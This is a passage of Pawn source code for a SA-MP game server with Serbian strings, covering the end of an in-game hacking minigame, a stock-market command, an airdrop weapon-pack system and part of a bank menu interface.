            PlayerTextDrawShow(playerid, HackingTD[playerid][13]);

            playerHacking[playerid] = 11;

            return 1;
        }

        case 12: {

            PlayerTextDrawShow(playerid, HackingTD[playerid][14]);

            playerHacking[playerid] = 12;

            return 1;
        }

        case 13: {

            new sifra = RandomNew(1000, 10000);

            new sifraString[45];
            format(sifraString, 45, "Hacking complete.. Password is : %d", sifra);
            PlayerTextDrawSetString(playerid, HackingTD[playerid][15], sifraString);

            playerHackingSifra[playerid] = sifra;

            for(new i = 15; i < 21; i++) {

                PlayerTextDrawShow(playerid, HackingTD[playerid][i]);
            }

            SelectTextDraw(playerid, SRVBOJA1);

            playerHacking[playerid] = 14;

            return 1;
        }
    }

    return 1;
}

CMD:deonice(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -791.1401,1936.2529,3.0459)) return SendErrorMessage(playerid, "Nisi u Stock Marketu!");

    ShowPlayerDialog(playerid, dialog_Deonice, DIALOG_STYLE_LIST, "Stock Market", "Trenutne cene\nProdaj Deonice\nKupi Deonice", "Potvrdi", "Odustani");

    return 1;
}

deoniceNewPrice() {

    new price = RandomNew(ServerInfo[cenaDeonicaMIN], ServerInfo[cenaDeonicaMAX]);

    new sellPrice = price - ((price * 5) / 100 );

    deoniceKupovna = price;
    deoniceProdajna = sellPrice;

    va_SendClientMessageToAll(0x31CC5AAA, "Nova kupovna cena deonica je %d$!", deoniceKupovna);
    va_SendClientMessageToAll(0x31CC5AAA, "Nova prodajna cena deonica je %d$!", deoniceProdajna);

    return 1;
}

task deonicePromenaCene[1800000]() {

    deoniceNewPrice();

    return 1;
}

AirDropTDCreate(playerid) {

    AirDropTD[playerid][0] = CreatePlayerTextDraw(playerid, 159.166625, 90.962989, "box");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][0], -0.000416, 29.624996);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][0], 521.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, AirDropTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, AirDropTD[playerid][0], 204);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][0], 1);

    AirDropTD[playerid][1] = CreatePlayerTextDraw(playerid, 275.416778, 95.111106, "Odaberite AirDrop Paket");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][1], 0.294583, 1.615555);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][1], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][1], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][1], 3);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][1], 1);

    AirDropTD[playerid][2] = CreatePlayerTextDraw(playerid, 508.333282, 94.333358, "ld_chat:thumbdn");
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][2], 10.000000, 13.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][2], -1);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][2], 4);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][2], 0);
    PlayerTextDrawSetSelectable(playerid, AirDropTD[playerid][2], true);

    AirDropTD[playerid][3] = CreatePlayerTextDraw(playerid, 177.083297, 155.777740, "box");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][3], 0.000000, 4.125000);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][3], 209.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][3], -1);
    PlayerTextDrawUseBox(playerid, AirDropTD[playerid][3], 1);
    PlayerTextDrawBoxColor(playerid, AirDropTD[playerid][3], 170);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][3], 1);

    AirDropTD[playerid][4] = CreatePlayerTextDraw(playerid, 177.499969, 213.851852, "box");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][4], 0.000000, 4.125000);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][4], 209.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][4], -1);
    PlayerTextDrawUseBox(playerid, AirDropTD[playerid][4], 1);
    PlayerTextDrawBoxColor(playerid, AirDropTD[playerid][4], 170);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][4], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][4], 1);

    AirDropTD[playerid][5] = CreatePlayerTextDraw(playerid, 177.500061, 270.888793, "box");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][5], 0.000000, 3.916666);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][5], 210.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][5], -1);
    PlayerTextDrawUseBox(playerid, AirDropTD[playerid][5], 1);
    PlayerTextDrawBoxColor(playerid, AirDropTD[playerid][5], 170);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][5], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][5], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][5], 1);

    AirDropTD[playerid][6] = CreatePlayerTextDraw(playerid, 179.583358, 157.592590, "ld_none:ship");
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][6], 26.000000, 28.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][6], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][6], -1);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][6], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][6], 4);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][6], 0);
    PlayerTextDrawSetSelectable(playerid, AirDropTD[playerid][6], true);

    AirDropTD[playerid][7] = CreatePlayerTextDraw(playerid, 180.833358, 217.740814, "ld_none:ship2");
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][7], 26.000000, 28.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][7], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][7], -1);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][7], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][7], 4);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][7], 0);
    PlayerTextDrawSetSelectable(playerid, AirDropTD[playerid][7], true);

    AirDropTD[playerid][8] = CreatePlayerTextDraw(playerid, 181.666702, 274.777923, "ld_none:ship3");
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][8], 26.000000, 28.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][8], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][8], -1);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][8], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][8], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][8], 4);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][8], 0);
    PlayerTextDrawSetSelectable(playerid, AirDropTD[playerid][8], true);

    AirDropTD[playerid][9] = CreatePlayerTextDraw(playerid, 368.750183, 150.851943, "samaps:map");
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][9], 146.000000, 159.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][9], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][9], -1);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][9], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][9], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][9], 4);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][9], 0);

    AirDropTD[playerid][10] = CreatePlayerTextDraw(playerid, 217.916793, 153.185195, "Paket 1:");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][10], 0.208333, 1.459999);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][10], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][10], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][10], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][10], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][10], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][10], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][10], 1);

    AirDropTD[playerid][11] = CreatePlayerTextDraw(playerid, 217.916809, 211.777832, "Paket 2:");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][11], 0.208333, 1.459999);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][11], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][11], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][11], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][11], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][11], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][11], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][11], 1);

    AirDropTD[playerid][12] = CreatePlayerTextDraw(playerid, 217.500152, 268.814941, "Paket 3:");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][12], 0.208333, 1.459999);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][12], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][12], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][12], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][12], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][12], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][12], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][12], 1);

    AirDropTD[playerid][13] = CreatePlayerTextDraw(playerid, 235.000167, 167.703750, "Deagle (50)~n~AK-47 (60)~n~Pancir (100)");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][13], 0.183750, 1.008889);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][13], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][13], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][13], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][13], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][13], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][13], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][13], 1);

    AirDropTD[playerid][14] = CreatePlayerTextDraw(playerid, 234.166839, 226.296417, "Deagle (50)~n~M4 (60)~n~MedKit (1)");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][14], 0.183750, 1.008889);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][14], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][14], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][14], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][14], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][14], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][14], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][14], 1);

    AirDropTD[playerid][15] = CreatePlayerTextDraw(playerid, 233.333496, 285.407562, "Deagle (20)~n~Sniper (10)~n~Medkit (2)");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][15], 0.183750, 1.008889);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][15], 427.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][15], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][15], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][15], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][15], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][15], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][15], 1);

    AirDropTD[playerid][16] = CreatePlayerTextDraw(playerid, 241.666748, 345.036987, "Pomoc: Paket odaberete klikom na jednu od 3 ikonice");
    PlayerTextDrawLetterSize(playerid, AirDropTD[playerid][16], 0.190416, 1.205927);
    PlayerTextDrawTextSize(playerid, AirDropTD[playerid][16], 655.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AirDropTD[playerid][16], 1);
    PlayerTextDrawColor(playerid, AirDropTD[playerid][16], 16777215);
    PlayerTextDrawSetShadow(playerid, AirDropTD[playerid][16], 0);
    PlayerTextDrawBackgroundColor(playerid, AirDropTD[playerid][16], 255);
    PlayerTextDrawFont(playerid, AirDropTD[playerid][16], 1);
    PlayerTextDrawSetProportional(playerid, AirDropTD[playerid][16], 1);

    return 1;
}

AirDropTDControl(playerid, bool:show) {

    if(!show) {

        for(new i = 0; i < 17; i++) {

            PlayerTextDrawHide(playerid, AirDropTD[playerid][i]);
        }

        AirDropShown[playerid] = false;

        TogglePlayerControllable(playerid, true);

        CancelSelectTextDraw(playerid);

        return 1;
    }
    else {

        for(new i = 0; i < 17; i++) {

            PlayerTextDrawShow(playerid, AirDropTD[playerid][i]);
        }

        SelectTextDraw(playerid, SRVBOJA1);

        TogglePlayerControllable(playerid, false);

        AirDropShown[playerid] = true;

        return 1;
    }
}

CMD:calldrop(playerid) {

    if(airdropActive[playerid]) return SendErrorMessage(playerid, "Ne mozes to sada!");
    if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi pozvao airdrop!");
    if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

    if(AirDropShown[playerid]) {

        AirDropTDControl(playerid, false);

        return 1;
    }
    else return AirDropTDControl(playerid, true);
}

createAirDrop(playerid, f, pack) {

    new Float:playerPos[3];

    GetPlayerPos(playerid, playerPos[0], playerPos[1], playerPos[2]);

    airdropData[f][airData] = pack;
    airdropData[f][airPosition][0] = playerPos[0];
    airdropData[f][airPosition][1] = playerPos[1];
    airdropData[f][airPosition][2] = playerPos[2];

    airdropData[f][airObjID] = CreateDynamicObject(18849, playerPos[0], playerPos[1], playerPos[2] + 60.0, 0, 0, 0, -1, -1, -1, 100.00, 100.00, -1, 0);
    MoveDynamicObject(airdropData[f][airObjID], playerPos[0], playerPos[1], airdropData[f][airPosition][2]+6.0, 7.0, 0, 0, 0);
}

public OnDynamicObjectMoved(objectid) {

    if(PubgPokrenut) {

        if(objectid == PubgAvionObjekat) {

            DestroyDynamicObject(PubgAvionObjekat);
            DestroyDynamicObject(cameraObj);

            foreach(Player, i) {

                if(PubgSkace[i]) {

                    stopPubgPlayer(i);

                    Novi_SetSpawnInfo( i );
                    SpawnPlayer( i );

                    PubgMessage(i, "Nisi skocio na vreme!");

                    return 1;
                }
            }
        }
    }

    for(new f = 0; f < MAX_AIRDROPS; f++) {

        if(objectid == airdropData[f][airObjID]) {

            airdropLabel[f] = CreateDynamic3DTextLabel("AirDrop\nDa uzmes paket kucaj /airdrop", 0x0066FFCC, airdropData[f][airPosition][0], airdropData[f][airPosition][1], airdropData[f][airPosition][2], 24);

            return 1;
        }
    }

    return 1;
}

CMD:airdrop( playerid, params[] ) {

    if( GetPlayerState(playerid) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Moras biti na nogama da bi bacio oruzje!");
    if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");

    new id = -1;
    for( new a = 0; a < MAX_AIRDROPS; a++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 5.0, airdropData[ a ][ airPosition ][ 0] , airdropData[ a ][ airPosition ][ 1 ], airdropData[ a ][ airPosition ][ 2 ] ) ) {
            id = a;
            break;
        }
    }
    if( id == -1 ) return SendErrorMessage( playerid, "Nemas airdrop u blizini." );
    if(!IsValidDynamic3DTextLabel(airdropLabel[id])) return SendErrorMessage(playerid, "Ovaj airdrop nije pao!");
    DestroyDynamicObject( airdropData[ id ][ airObjID ] );
    DestroyDynamic3DTextLabel(airdropLabel[id]);

    if(airdropData[id][airData] == 1) {

        GiveWeaponToPlayer(playerid, 24, 50);
        GiveWeaponToPlayer(playerid, 30, 60);
        Novi_SetPlayerArmour(playerid, 100);
    }
    else if(airdropData[id][airData] == 2) {

        GiveWeaponToPlayer(playerid, 24, 50);
        GiveWeaponToPlayer(playerid, 31, 60);
        PlayerInfo[playerid][xMedKit] += 1;
        SavePlayer(playerid);
    }
    else if(airdropData[id][airData] == 3) {

        GiveWeaponToPlayer(playerid, 24, 20);
        GiveWeaponToPlayer(playerid, 34, 10);      
        PlayerInfo[playerid][xMedKit] += 2;
        SavePlayer(playerid);  
    }

    ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 0, 0, 0, 0, 0 );

    airdropData[ id ][ airPosition ][ 0 ] = 0.0;
    airdropData[ id ][ airPosition ][ 1 ] = 0.0;
    airdropData[ id ][ airPosition ][ 2 ] = 0.0;
    airdropData[ id ][ airObjID ] = -1;
    airdropData[ id ][ airData ] = 0;

    SendInfoMessage(playerid, "Uspesno si pokupio airdrop!");
    return true;
}

timer airDropCallTimer[900000](playerid) {

    airdropActive[playerid] = false;

    return 1;
}

bankaTDCreate(playerid) {

    BankaTD[playerid][0] = CreatePlayerTextDraw(playerid, 323.749877, 104.962982, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][0], 0.000000, 25.791673);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][0], 0.000000, 414.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][0], 2);
    PlayerTextDrawColor(playerid, BankaTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][0], -506285850);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][0], 1);

    BankaTD[playerid][1] = CreatePlayerTextDraw(playerid, 113.749984, 98.740722, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][1], 0.000000, 2.791666);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][1], 259.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][1], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][1], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][1], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][1], 1);

    BankaTD[playerid][2] = CreatePlayerTextDraw(playerid, 139.583435, 102.888862, "Bankovni Racun");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][2], 0.355832, 1.506664);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][2], 391.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][2], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][2], 1);

    BankaTD[playerid][3] = CreatePlayerTextDraw(playerid, 120.416702, 143.851959, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][3], 0.000000, 2.083333);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][3], 219.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][3], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][3], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][3], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][3], 1);

    BankaTD[playerid][4] = CreatePlayerTextDraw(playerid, 120.833366, 177.037216, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][4], 0.000000, 2.083333);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][4], 219.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][4], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][4], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][4], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][4], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][4], 1);

    BankaTD[playerid][5] = CreatePlayerTextDraw(playerid, 120.833366, 208.666915, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][5], 0.000000, 2.083333);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][5], 219.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][5], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][5], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][5], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][5], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][5], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][5], 1);

    BankaTD[playerid][6] = CreatePlayerTextDraw(playerid, 120.833374, 240.296569, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][6], 0.000000, 2.083333);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][6], 220.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][6], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][6], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][6], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][6], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][6], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][6], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][6], 1);

    BankaTD[playerid][7] = CreatePlayerTextDraw(playerid, 120.416702, 272.963287, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][7], 0.000000, 2.041666);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][7], 220.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][7], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][7], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][7], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][7], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][7], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][7], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][7], 1);

    BankaTD[playerid][8] = CreatePlayerTextDraw(playerid, 120.416702, 303.555816, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][8], 0.000000, 2.041666);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][8], 220.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][8], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][8], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][8], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][8], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][8], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][8], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][8], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][8], 1);

    BankaTD[playerid][9] = CreatePlayerTextDraw(playerid, 137.083450, 146.962921, "Otvori Racun");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][9], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][9], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][9], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][9], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][9], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][9], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][9], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][9], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][9], true);

    BankaTD[playerid][10] = CreatePlayerTextDraw(playerid, 137.083435, 180.148101, "Podigni Novac");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][10], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][10], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][10], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][10], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][10], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][10], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][10], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][10], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][10], true);

    BankaTD[playerid][11] = CreatePlayerTextDraw(playerid, 137.500091, 212.296264, "Ostavi Novac");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][11], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][11], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][11], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][11], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][11], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][11], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][11], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][11], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][11], true);

    BankaTD[playerid][12] = CreatePlayerTextDraw(playerid, 137.500106, 243.407363, "Transfer");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][12], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][12], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][12], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][12], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][12], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][12], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][12], 1);
